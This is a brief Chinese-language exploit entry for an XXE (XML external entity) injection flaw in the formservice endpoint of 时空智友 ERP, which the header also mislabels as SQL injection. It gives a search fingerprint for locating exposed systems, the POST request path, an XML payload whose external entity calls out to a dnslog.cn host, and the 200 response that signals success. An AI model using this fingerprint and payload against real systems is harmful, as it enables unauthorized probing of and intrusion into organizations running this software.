# 时空智友ERPformservice存在XML注入漏洞

时空智友 ｜ SQL注入 ｜ —
- **指纹**：`body="时空智友企业信息管理`
- **请求**：`POST /formservice?service=richclient.openForm HTTP/1.1`

**Payload**
```
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY>
<!ENTITY xxe SYSTEM "http://xxe1.omfras.dnslog.cn">]>
<foo>&xxe;</foo>
```
- **响应特征**：200